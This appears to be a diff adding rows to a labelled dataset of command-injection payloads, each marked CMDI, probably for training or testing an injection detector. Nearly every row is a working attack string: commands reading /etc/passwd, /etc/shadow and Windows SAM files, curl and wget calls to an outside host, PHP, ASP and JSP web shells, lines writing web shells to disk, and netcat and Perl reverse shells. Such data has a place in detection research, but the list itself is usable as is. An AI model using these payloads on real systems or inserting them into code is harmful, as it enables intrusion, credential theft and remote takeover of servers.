+&& system('curl https://crowdshield.com/.testing/rce_vuln.txt');,CMDI
+&& system('curl https://crowdshield.com/.testing/rce_vuln.txt');,CMDI
+&& system('curl https://crowdshield.com/.testing/rce_vuln.txt');,CMDI
+&& system('curl https://crowdshield.com/.testing/rce_vuln.txt');,CMDI
+&& system('sleep 5');,CMDI
+&& system('sleep 5');,CMDI
+&& system('sleep 5');,CMDI
+&& system('sleep 5');,CMDI
+&& systeminfo,CMDI
+&& systeminfo,CMDI
+&& systeminfo,CMDI
+&& systeminfo,CMDI
+&& type %SYSTEMROOT%\repair\SAM,CMDI
+&& type %SYSTEMROOT%\repair\SAM,CMDI
+&& type %SYSTEMROOT%\repair\SAM,CMDI
+&& type %SYSTEMROOT%\repair\SAM,CMDI
+&& type %SYSTEMROOT%\repair\SYSTEM,CMDI
+&& type %SYSTEMROOT%\repair\SYSTEM,CMDI
+&& type %SYSTEMROOT%\repair\SYSTEM,CMDI
+&& type %SYSTEMROOT%\repair\SYSTEM,CMDI
+&& type C:\Windows\repair\SAM,CMDI
+&& type C:\Windows\repair\SAM,CMDI
+&& type C:\Windows\repair\SAM,CMDI
+&& type C:\Windows\repair\SAM,CMDI
+&& type C:\Windows\repair\SYSTEM,CMDI
+&& type C:\Windows\repair\SYSTEM,CMDI
+&& type C:\Windows\repair\SYSTEM,CMDI
+&& type C:\Windows\repair\SYSTEM,CMDI
+&& type C:\WINNT\repair\SAM,CMDI
+&& type C:\WINNT\repair\SAM,CMDI
+&& type C:\WINNT\repair\SAM,CMDI
+&& type C:\WINNT\repair\SAM,CMDI
+&& uname -a,CMDI
+&& uname -a,CMDI
+&& uname -a,CMDI
+&& uname -a,CMDI
+&& wget https://crowdshield.com/.testing/rce_vuln.txt,CMDI
+&& wget https://crowdshield.com/.testing/rce_vuln.txt,CMDI
+&& wget https://crowdshield.com/.testing/rce_vuln.txt,CMDI
+&& wget https://crowdshield.com/.testing/rce_vuln.txt,CMDI
+&& whoami,CMDI
+&& whoami,CMDI
+&& whoami,CMDI
+&& whoami,CMDI
+&&{cmd},CMDI
+&&{cmd}&&,CMDI
+&&+ping',CMDI
+&&CMD=$'{cmd}';$CMD,CMDI
+"&&CMD=$""{cmd}"";$CMD",CMDI
+&&CMD=$\'{cmd}\';$CMD,CMDI
+&&echo%20CMMOTV$((30%2B10))$(echo%20CMMOTV)CMMOTV',CMDI
+&&echo%20PVJXOS$((12%2B1))$(echo%20PVJXOS)PVJXOS,CMDI
+&&type C:\\boot.ini,CMDI
+&&type C:\\boot.ini,CMDI
+&&type C:\\boot.ini,CMDI
+&&type C:\\boot.ini,CMDI
+&CMD=$'{cmd}';$CMD,CMDI
+"&CMD=$""{cmd}"";$CMD",CMDI
+&CMD=$\'{cmd}\';$CMD,CMDI
+&echo%20DACXMN$((57%2B35))$(echo%20DACXMN)DACXMN',CMDI
+&echo%20NWMZCF$((57%2B72))$(echo%20NWMZCF)NWMZCF,CMDI
+"&echo%20WQLTXV$((0%2B25))$(echo%20WQLTXV)WQLTXV""",CMDI
+&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/passwd&quot;--&gt;,CMDI
+&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/passwd&quot;--&gt;,CMDI
+&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/passwd&quot;--&gt;,CMDI
+&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/shadow&quot;--&gt;,CMDI
+&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/shadow&quot;--&gt;,CMDI
+&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/shadow&quot;--&gt;,CMDI
+&lt;!--#exec%20cmd=&quot;/usr/bin/id;--&gt;,CMDI
+&lt;!--#exec%20cmd=&quot;/usr/bin/id;--&gt;,CMDI
+&lt;!--#exec%20cmd=&quot;/usr/bin/id;--&gt;,CMDI
+&lt;!--#exec%20cmd=&quot;/usr/bin/id;--&gt;,CMDI
+&lt;!--#exec%20cmd=&quot;/usr/bin/id;--&gt;,CMDI
+&lt;!--#exec%20cmd=&quot;/usr/bin/id;--&gt;,CMDI
+%%32%65%%32%65/%%32%65%%32%65/file.ini',CMDI
+%00../../../../../../etc/passwd,CMDI
+%00../../../../../../etc/shadow,CMDI
+%00/etc/passwd%00,CMDI
+%00/etc/shadow%00,CMDI
+%0a,CMDI
+%0a,CMDI
+%0a,CMDI
+%0a,CMDI
+%0a id %0a,CMDI
+%0a id %0a,CMDI
+%0a id %0a,CMDI
+%0a id %0a,CMDI
+%0a id %0a,CMDI
+%0a id %0a,CMDI
+%0a id %0a,CMDI
+%0a id %0a,CMDI
+%0a ping -i 30 127.0.0.1 %0a,CMDI
+%0a ping -i 30 127.0.0.1 %0a,CMDI
+%0a ping -i 30 127.0.0.1 %0a,CMDI
+%0a ping -i 30 127.0.0.1 %0a,CMDI
+%0a ping -i 30 127.0.0.1 %0a,CMDI
+%0a ping -i 30 127.0.0.1 %0a,CMDI
+%0a ping -i 30 127.0.0.1 %0a,CMDI
+%0a ping -i 30 127.0.0.1 %0a,CMDI
+%0A{cmd},CMDI
+%0A{cmd}%0A,CMDI
+%0a/bin/cat%20/etc/passwd,CMDI
+%0a/bin/cat%20/etc/shadow,CMDI
+%0A/usr/bin/id,CMDI
+%0A/usr/bin/id,CMDI
+%0A/usr/bin/id,CMDI
+%0A/usr/bin/id,CMDI
+%0A/usr/bin/id,CMDI
+%0A/usr/bin/id,CMDI
+%0A/usr/bin/id,CMDI
+%0A/usr/bin/id,CMDI
+%0A/usr/bin/id%0A,CMDI
+%0A/usr/bin/id%0A,CMDI
+%0A/usr/bin/id%0A,CMDI
+%0A/usr/bin/id%0A,CMDI
+%0A/usr/bin/id%0A,CMDI
+%0A/usr/bin/id%0A,CMDI
+%0A/usr/bin/id%0A,CMDI
+%0A/usr/bin/id%0A,CMDI
+%0a%0d,CMDI
+%0a%0d,CMDI
+%0a%0d,CMDI
+%0a%0d,CMDI
+%0a+dir+c:\,CMDI
+%0a+dir+c:%255c,CMDI
+%0a+dir+c:%2f,CMDI
+%0a+ping+localhost+-i+3',CMDI
+%0Acat%20/etc/passwd,CMDI
+%0Acat%20/etc/passwd,CMDI
+%0Acat%20/etc/passwd,CMDI
+%0Acat%20/etc/passwd,CMDI
+%0Acat%20/etc/passwd,CMDI
+%0Acat%20/etc/passwd,CMDI
+%0Acat%20/etc/passwd,CMDI
+%0Acat%20/etc/passwd,CMDI
+%0aecho%20VKWHEH$((83%2B36))$(echo%20VKWHEH)VKWHEH',CMDI
+%0aecho%20VVIEOJ$((30%2B78))$(echo%20VVIEOJ)VVIEOJ,CMDI
+%0Aid,CMDI
+%0Aid,CMDI
+%0Aid,CMDI
+%0Aid,CMDI
+%0Aid,CMDI
+%0Aid,CMDI
+%0Aid,CMDI
+%0Aid%0A,CMDI
+%0Aid%0A,CMDI
+%0Aid%0A,CMDI
+%0Aid%0A,CMDI
+%0Aid%0A,CMDI
+%0Aid%0A,CMDI
+%0Aid%0A,CMDI
+%0D{cmd},CMDI
+%0D{cmd}%0D,CMDI
+%0DCMD=$'{cmd}';$CMD,CMDI
+"%0DCMD=$""{cmd}"";$CMD",CMDI
+%0DCMD=$\'{cmd}\';$CMD,CMDI
+"%2 -n 21 127.0.0.1||`ping -c 21 127.0.0.1` #' |ping -n 21 127.0.0.1||`ping -c 21 127.0.0.1` #\"" |ping -n 21 127.0.0.1",CMDI
+"%2 -n 21 127.0.0.1||`ping -c 21 127.0.0.1` #' |ping -n 21 127.0.0.1||`ping -c 21 127.0.0.1` #\"" |ping -n 21 127.0.0.1",CMDI
+"%2 -n 21 127.0.0.1||`ping -c 21 127.0.0.1` #' |ping -n 21 127.0.0.1||`ping -c 21 127.0.0.1` #\"" |ping -n 21 127.0.0.1",CMDI
+"%2 -n 21 127.0.0.1||`ping -c 21 127.0.0.1` #' |ping -n 21 127.0.0.1||`ping -c 21 127.0.0.1` #\"" |ping -n 21 127.0.0.1",CMDI
+%20{${phpinfo()}},CMDI
+%20{${phpinfo()}},CMDI
+%20{${phpinfo()}},CMDI
+%20{${phpinfo()}},CMDI
+%20{${sleep(20)}},CMDI
+%20{${sleep(20)}},CMDI
+%20{${sleep(20)}},CMDI
+%20{${sleep(20)}},CMDI
+%20{${sleep(3)}},CMDI
+%20{${sleep(3)}},CMDI
+%20{${sleep(3)}},CMDI
+%20{${sleep(3)}},CMDI
+"%20echo%20BAJXZZ$((73%2B7))$(echo%20BAJXZZ)BAJXZZ""",CMDI
+%20echo%20HBFEEM$((46%2B2))$(echo%20HBFEEM)HBFEEM',CMDI
+%20echo%20TDJHRY$((30%2B41))$(echo%20TDJHRY)TDJHRY,CMDI
+%22%0A/usr/bin/id%0A%22,CMDI
+%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%,CMDI
+%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%,CMDI
+%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%00,CMDI
+%26%26+|+dir c:\,CMDI
+%26%26+|+dir c:%255c,CMDI
+%26%26+|+dir c:%2f,CMDI
+%26%26echo%20EXUMZL$((4%2B99))$(echo%20EXUMZL)EXUMZL',CMDI
+%26%26echo%20QOZRFB$((19%2B4))$(echo%20QOZRFB)QOZRFB,CMDI
+%26echo%20NQPWBV$((16%2B77))$(echo%20NQPWBV)NQPWBV,CMDI
+%26echo%20VOANQN$((77%2B86))$(echo%20VOANQN)VOANQN',CMDI
+%27%0A/usr/bin/id%0A%27,CMDI
+%2e%2e/%2e%2e/file',CMDI
+%2e%2e%2f%2e%2e%2ffile',CMDI
+%31%3b%6c%73%20%2d%61%6c%3b',CMDI
+%31%3b%6e%63%20%2d%65%20%2f%62%69%6e%2f%73%68%20%31%2e%31%2e%31%2e%31%20%33%33',CMDI
+%3Becho%20RDKWWC$((22%2B44))$(echo%20RDKWWC)RDKWWC',CMDI
+%3Becho%20SRPJET$((29%2B34))$(echo%20SRPJET)SRPJET,CMDI
+%7C%7Cecho%20HYHREQ$((78%2B11))$(echo%20HYHREQ)HYHREQ',CMDI
+%7C%7Cecho%20KRCSNE$((57%2B75))$(echo%20KRCSNE)KRCSNE,CMDI
+%7Cecho%20IRODNG$((26%2B68))$(echo%20IRODNG)IRODNG,CMDI
+%7Cecho%20VDZSYZ$((58%2B1))$(echo%20VDZSYZ)VDZSYZ',CMDI
+%x('ls -al /'),CMDI
+`ping 127.0.0.1`,CMDI
+`ping 127.0.0.1`,CMDI
+`ping 127.0.0.1`,CMDI
+`ping 127.0.0.1`,CMDI
+`ping 127.0.0.1`,CMDI
+`ping 127.0.0.1`,CMDI
+`ping 127.0.0.1`,CMDI
+`ping 127.0.0.1`,CMDI
+`touch /tmp/blns.fail`,CMDI
+^{cmd},CMDI
+^CMD=$'{cmd}';$CMD,CMDI
+"^CMD=$""{cmd}"";$CMD",CMDI
+^CMD=$\'{cmd}\';$CMD,CMDI
++++ATH0,CMDI
+"<!--#exec cmd=""{cmd}""-->",CMDI
+"<!--#exec cmd=""/bin/cat /etc/passwd""-->",CMDI
+"<!--#exec cmd=""/bin/cat /etc/passwd""-->",CMDI
+"<!--#exec cmd=""/bin/cat /etc/passwd""-->",CMDI
+"<!--#exec cmd=""/bin/cat /etc/passwd""-->",CMDI
+"<!--#exec cmd=""/bin/cat /etc/shadow""-->",CMDI
+"<!--#exec cmd=""/bin/cat /etc/shadow""-->",CMDI
+"<!--#exec cmd=""/bin/cat /etc/shadow""-->",CMDI
+"<!--#exec cmd=""/bin/cat /etc/shadow""-->",CMDI
+"<!--#exec cmd=""/bin/ls /"" --><br/>",CMDI
+"<!--#exec cmd=""/usr/bin/id;-->",CMDI
+"<!--#exec cmd=""/usr/bin/id;-->",CMDI
+"<!--#exec cmd=""/usr/bin/id;-->",CMDI
+"<!--#exec cmd=""/usr/bin/id;-->",CMDI
+"<!--#exec cmd=""/usr/bin/id""-->",CMDI
+"<!--#exec cmd=""cat /etc/passwd"" --><br/>",CMDI
+"<!--#exec cmd=""find / -name . -print"" --><br/>",CMDI
+"<!--#exec cmd=""id""-->",CMDI
+"<!--#exec cmd=""mail Florian Roth @4nc4p <mailto:Florian Roth @4nc4p> < cat /etc/passwd"" --><br/>",CMDI
+"<?php system(""cat /etc/passwd"");?>",CMDI
+"<?php system(""cat /etc/passwd"");?>",CMDI
+"<?php system(""cat /etc/passwd"");?>",CMDI
+"<?php system(""cat /etc/passwd"");?>",CMDI
+"<?php system(""curl https://crowdshield.com/.testing/rce_vuln.txt?method=phpsystem_get"");?>",CMDI
+"<?php system(""curl https://crowdshield.com/.testing/rce_vuln.txt?method=phpsystem_get"");?>",CMDI
+"<?php system(""curl https://crowdshield.com/.testing/rce_vuln.txt?method=phpsystem_get"");?>",CMDI
+"<?php system(""curl https://crowdshield.com/.testing/rce_vuln.txt?method=phpsystem_get"");?>",CMDI
+"<?php system(""curl https://crowdshield.com/.testing/rce_vuln.txt?req=df2fkjj"");?>",CMDI
+"<?php system(""curl https://crowdshield.com/.testing/rce_vuln.txt?req=df2fkjj"");?>",CMDI
+"<?php system(""curl https://crowdshield.com/.testing/rce_vuln.txt?req=df2fkjj"");?>",CMDI
+"<?php system(""curl https://crowdshield.com/.testing/rce_vuln.txt?req=df2fkjj"");?>",CMDI
+"<?php system(""echo XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"");?>",CMDI
+"<?php system(""echo XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"");?>",CMDI
+"<?php system(""echo XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"");?>",CMDI
+"<?php system(""echo XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"");?>",CMDI
+"<?php system(""sleep 10"");?>",CMDI
+"<?php system(""sleep 10"");?>",CMDI
+"<?php system(""sleep 10"");?>",CMDI
+"<?php system(""sleep 10"");?>",CMDI
+"<?php system(""sleep 5"");?>",CMDI
+"<?php system(""sleep 5"");?>",CMDI
+"<?php system(""sleep 5"");?>",CMDI
+"<?php system(""sleep 5"");?>",CMDI
+"<?php system(""wget https://crowdshield.com/.testing/rce_vuln.txt?method=phpsystem_get"");?>",CMDI
+"<?php system(""wget https://crowdshield.com/.testing/rce_vuln.txt?method=phpsystem_get"");?>",CMDI
+"<?php system(""wget https://crowdshield.com/.testing/rce_vuln.txt?method=phpsystem_get"");?>",CMDI
+"<?php system(""wget https://crowdshield.com/.testing/rce_vuln.txt?method=phpsystem_get"");?>",CMDI
+"<?php system(""wget https://crowdshield.com/.testing/rce_vuln.txt?req=jdfj2jc"");?>",CMDI
+"<?php system(""wget https://crowdshield.com/.testing/rce_vuln.txt?req=jdfj2jc"");?>",CMDI
+"<?php system(""wget https://crowdshield.com/.testing/rce_vuln.txt?req=jdfj2jc"");?>",CMDI
+"<?php system(""wget https://crowdshield.com/.testing/rce_vuln.txt?req=jdfj2jc"");?>",CMDI
+"<?php system($_GET[""cmd""]) ?>",CMDI
+<{cmd}%0A,CMDI
+<{cmd}%0D,CMDI
+"<% eval request(""cmd"") %>",CMDI
+"<% Runtime.getruntime().exec(request.getParameter(""cmd"")) %>",CMDI
+<<< %s(un='%s') = %u,CMDI
+| curl http://crowdshield.com/.testing/rce.txt,CMDI
+| curl http://crowdshield.com/.testing/rce.txt,CMDI
+| curl http://crowdshield.com/.testing/rce.txt,CMDI
+| curl http://crowdshield.com/.testing/rce.txt,CMDI
+| dir C:\Documents and Settings\*,CMDI
+| dir C:\Documents and Settings\*,CMDI
+| dir C:\Documents and Settings\*,CMDI
+| dir C:\Documents and Settings\*,CMDI
+| dir C:\Users,CMDI
+| dir C:\Users,CMDI
+| dir C:\Users,CMDI
+| dir C:\Users,CMDI
+"| echo ""<?php include($_GET['page'])| ?>"" > rfi.php",CMDI
+"| echo ""<?php include($_GET['page'])| ?>"" > rfi.php",CMDI
+"| echo ""<?php include($_GET['page'])| ?>"" > rfi.php",CMDI
+"| echo ""<?php include($_GET['page'])| ?>"" > rfi.php",CMDI
+"| echo ""<?php system('dir $_GET['dir']')| ?>"" > dir.php ",CMDI
+"| echo ""<?php system('dir $_GET['dir']')| ?>"" > dir.php ",CMDI
+"| echo ""<?php system('dir $_GET['dir']')| ?>"" > dir.php ",CMDI
+"| echo ""<?php system('dir $_GET['dir']')| ?>"" > dir.php ",CMDI
+"| echo ""<?php system($_GET['cmd'])| ?>"" > cmd.php",CMDI
+"| echo ""<?php system($_GET['cmd'])| ?>"" > cmd.php",CMDI
+"| echo ""<?php system($_GET['cmd'])| ?>"" > cmd.php",CMDI
+"| echo ""<?php system($_GET['cmd'])| ?>"" > cmd.php",CMDI
+"| echo ""use Socket;$i=""192.168.16.151"";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">;S"");open(STDOUT,"">;S"");open(STDERR,"">;S"");exec(""/bin/sh -i"");};"" > rev.pl",CMDI
+"| echo ""use Socket;$i=""192.168.16.151"";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">;S"");open(STDOUT,"">;S"");open(STDERR,"">;S"");exec(""/bin/sh -i"");};"" > rev.pl",CMDI
+"| echo ""use Socket;$i=""192.168.16.151"";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">;S"");open(STDOUT,"">;S"");open(STDERR,"">;S"");exec(""/bin/sh -i"");};"" > rev.pl",CMDI
